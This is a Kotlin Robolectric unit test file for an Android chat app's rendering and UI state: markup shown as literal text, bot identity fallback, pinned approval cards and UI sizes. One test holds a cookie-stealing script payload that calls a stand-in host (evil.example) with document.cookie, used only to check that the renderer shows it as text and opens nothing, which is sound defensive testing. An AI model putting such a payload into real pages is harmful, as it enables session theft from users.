package ai.namastex.automagik

import org.junit.Assert.assertEquals
import org.junit.Assert.assertNull
import org.junit.Assert.assertTrue
import org.junit.Test
import org.junit.runner.RunWith
import org.robolectric.RobolectricTestRunner
import org.robolectric.annotation.Config

/**
 * What the chat hands Compose's [androidx.compose.material3.Text]: an AnnotatedString whose characters are the row's
 * own, so markup shows as the characters it is. The only annotations are tap-only links; building it opens nothing.
 */
@RunWith(RobolectricTestRunner::class)
@Config(sdk = [35])
class ChatRenderTest {
    private fun drawn(text: String, opened: MutableList<String>) =
        (ChatText.blocks(text).single() as ChatText.Prose).let { chatAnnotated(it.spans) { url -> opened += url } }

    @Test fun imgTagIsDrawnAsItsCharactersWithNothingToLoad() {
        val opened = mutableListOf<String>()
        val shown = drawn("<img src=x>", opened)
        assertEquals("<img src=x>", shown.text)
        assertTrue(shown.getLinkAnnotations(0, shown.length).isEmpty())
        assertTrue(shown.spanStyles.isEmpty() && shown.paragraphStyles.isEmpty())
        assertTrue(opened.isEmpty())
    }

    @Test fun scriptTagIsDrawnAsItsCharactersAndRunsNothing() {
        val opened = mutableListOf<String>()
        val text = "<script>fetch('https://evil.example/steal?c='+document.cookie)</script>"
        val shown = drawn(text, opened)
        assertEquals(text, shown.text)
        // The URL inside is a link span over its own target, and building the text opened nothing.
        val links = shown.getLinkAnnotations(0, shown.length)
        assertEquals(listOf("https://evil.example/steal?c="), links.map { shown.text.substring(it.start, it.end) })
        assertTrue(opened.isEmpty())
    }

    private fun chat(terminal: String = "dsh:s1", title: String = "", registryId: String? = null) =
        Chat.Terminal(terminal, "machine", "codex", title, "blocked", "chat", true, registryId)

    private fun member(id: String, name: String, pet: String?) = Teams.Member(id, name, false, pet)

    private fun pane(bot: String? = null, title: String = "Review", status: String = "blocked", statusMs: Long = 0) =
        CoreTerminal("t1", title, "~/project", "live", status, "codex", "", 80, 24,
            labels = if (bot == null) emptyMap() else mapOf("bot" to bot), statusMs = statusMs)

    @Test fun barTakesTheBotChatsNameAndItsRegistryPet() {
        val identity = chatIdentity(chat(title = "Integrator", registryId = "b-1"), null,
            listOf(member("b-1", "Integrator", "wisp")), Teams.NEEDS_YOU)
        assertEquals("Integrator", identity.name)
        assertEquals("wisp", identity.pet)
        assertEquals(Teams.NEEDS_YOU, identity.pose)
    }

    @Test fun barFallsBackFromListingToRegistryToPaneThenAutomagikBot() {
        val listing = chat(title = "", registryId = "b-2")
        val terminal = pane(bot = "b-2", title = "Pane title")
        assertEquals("Reviewer", chatIdentity(listing, terminal, listOf(member("b-2", "Reviewer", "capy")), Teams.IDLE).name)
        assertEquals("capy", chatIdentity(listing, terminal, listOf(member("b-2", "Reviewer", "capy")), Teams.IDLE).pet)
        // A pane with no listing is still its labelled bot's.
        assertEquals("Reviewer", chatIdentity(null, terminal, listOf(member("b-2", "Reviewer", "capy")), Teams.IDLE).name)
        // No registry member: the pane's title, then the app's word for an unnamed chat.
        assertEquals("Pane title", chatIdentity(null, terminal, emptyList(), Teams.IDLE).name)
        val unnamed = chatIdentity(null, null, emptyList(), Teams.IDLE)
        assertEquals(Cockpit.BOT, unnamed.name)
        assertNull(unnamed.pet)
    }

    @Test fun aDshSessionIdFindsItsRegistryMember() {
        val identity = chatIdentity(chat(terminal = "dsh:s1"), null, listOf(member("s1", "Integrator", "wisp")), Teams.NEEDS_YOU)
        assertEquals("Integrator", identity.name)
        assertEquals("wisp", identity.pet)
    }

    @Test fun theOpenCardLeavesTheMessageListAndKeepsFoldedCalls() {
        val approval = Chat.Row(id = "a1", kind = "approval", open = true, tool = "Bash", summary = "git status",
            choices = listOf("allow", "allow-always", "deny"))
        val question = Chat.Row(id = "q1", kind = "question", open = true, prompt = "Which branch?", options = listOf("dev"))
        val text = Chat.Row("t1", "text", text = "hello")
        val tool = Chat.Row("c1", "tool-call", tool = "Bash", summary = "ls")
        val state = Chat.State("dsh:s1", rows = listOf(approval, text, question, tool), approval = approval, question = question)
        assertEquals(listOf("t1", "c1"), chatListRows(state).map { it.id })
        assertEquals(listOf("q1", "a1"), chatPending(state).map { it.id })
        assertTrue(chatListRows(state).any { it.kind == "tool-call" })
    }

    @Test fun aReadOnlyQuestionWithoutTheOpenFieldIsStillPinned() {
        // bots-dsh's pendingRowOf sends a read-only question with no open field; the reducer keeps it as s.question.
        val question = Chat.Row(id = "q1", kind = "question", open = false, prompt = Chat.ANSWER_ON_COMPUTER, answerable = false)
        val state = Chat.State("dsh:s1", question = question)
        assertEquals(listOf("q1"), chatPending(state).map { it.id })
        assertTrue(chatListRows(state).isEmpty())
        // The same row in a transcript is shown once, pinned above the composer.
        val inRows = state.copy(rows = listOf(question))
        assertEquals(listOf("q1"), chatPending(inRows).map { it.id })
        assertTrue(chatListRows(inRows).isEmpty())
    }

    @Test fun thePetUsesTheExistingPoseTables() {
        val now = 1_000_000L
        val approval = Chat.Row(id = "a1", kind = "approval", open = true)
        assertEquals(Teams.NEEDS_YOU, chatPose(Chat.State("dsh:s1", status = Chat.Status("working"), approval = approval), null, now))
        assertEquals(Teams.WORKING, chatPose(Chat.State("dsh:s1", status = Chat.Status("working")), null, now))
        assertEquals(Teams.IDLE, chatPose(Chat.State("dsh:s1", status = Chat.Status("idle")), null, now))
        // A terminal chat uses Teams.poseOf, so done and error are not sleep.
        assertEquals(Teams.DONE, chatPose(Chat.State("t1", status = Chat.Status("done")), pane(status = "done"), now))
        assertEquals(Teams.FAILED, chatPose(Chat.State("t1", status = Chat.Status("error")), pane(status = "error"), now))
        assertEquals(Teams.IDLE, chatPose(Chat.State("t1", status = Chat.Status("idle")), pane(status = "idle"), now))
        assertEquals(Teams.ASLEEP, chatPose(Chat.State("t1", status = Chat.Status("idle"), gone = true), pane(status = "idle"), now))
        // A Bot chat uses Teams.poseOfChat, the chat's own state words.
        assertEquals(Teams.ASLEEP, chatPose(Chat.State("dsh:s1", status = Chat.Status("done")), null, now))
    }

    @Test fun theApprovalIsPinnedFirstAndTheQuestionStaysReachable() {
        val approval = Chat.Row(id = "a1", kind = "approval", open = true, tool = "Bash", summary = "tests")
        val question = Chat.Row(id = "q1", kind = "question", open = true, prompt = "Which build?")
        val state = Chat.State("dsh:s1", approval = approval, question = question)
        assertEquals("a1", chatPinned(state, null)?.id)
        assertEquals("q1", chatPinned(state, "q1")?.id)
        assertEquals("q1", chatPinned(Chat.State("dsh:s1", question = question), null)?.id)
    }

    @Test fun theBarNamesThePinnedCard() {
        val approval = Chat.Row(id = "a1", kind = "approval", open = true, tool = "Bash", summary = "Run the tests")
        val question = Chat.Row(id = "q1", kind = "question", open = true, prompt = "Which build?")
        assertEquals("Needs your approval · Bash: Run the tests",
            chatStateLine(Chat.State("dsh:s1", status = Chat.Status("blocked", msg = "Needs your approval")), approval))
        assertEquals("Question · Which build?",
            chatStateLine(Chat.State("dsh:s1", status = Chat.Status("blocked", msg = "Needs your approval")), question))
    }

    @Test fun aFoldedRowShowsWhetherItIsOpen() {
        assertEquals("▸ Bash: ls", collapsedLabel(false, "Bash: ls"))
        assertEquals("▾ Bash: ls", collapsedLabel(true, "Bash: ls"))
        assertEquals("↳ failed", collapsedLabel(false, "failed", result = true))
        assertEquals("▾ failed", collapsedLabel(true, "failed", result = true))
    }

    @Test fun theBarKeepsTheStateText() {
        assertEquals("Needs you · Waiting for approval",
            chatStateLine(Chat.State("dsh:s1", status = Chat.Status("blocked", msg = "Waiting for approval"))))
        assertEquals("Working · Sample turn finished",
            chatStateLine(Chat.State("dsh:s1", status = Chat.Status("working", msg = "Sample turn finished"))))
        assertEquals("Ended", chatStateLine(Chat.State("dsh:s1", gone = true)))
        assertEquals("Machine offline", chatStateLine(Chat.State("dsh:s1", offline = true)))
    }

    @Test fun theMockSizesArePinned() {
        assertEquals(52f, ChatStyle.CARD_BUTTON_HEIGHT.value)
        assertEquals(26f, ChatStyle.CARD_BUTTON_RADIUS.value)
        assertEquals(16f, ChatStyle.CARD_BUTTON_TEXT.value)
        assertEquals(17f, ChatStyle.CARD_CONFIRM_TEXT.value)
        assertEquals(420f, ChatStyle.PENDING_MAX_HEIGHT.value)
        assertEquals(56f, ChatStyle.COMPOSER_HEIGHT.value)
        assertEquals(28f, ChatStyle.COMPOSER_RADIUS.value)
        assertEquals(17f, ChatStyle.COMPOSER_TEXT.value)
    }

    /** The Question/Approval switch is a tap target: it must be at least the 48dp minimum (#1040). */
    @Test fun theModeSwitchIsAtLeast48Dp() {
        assertTrue(ChatStyle.SWITCH_HEIGHT.value >= 48f)
    }
}
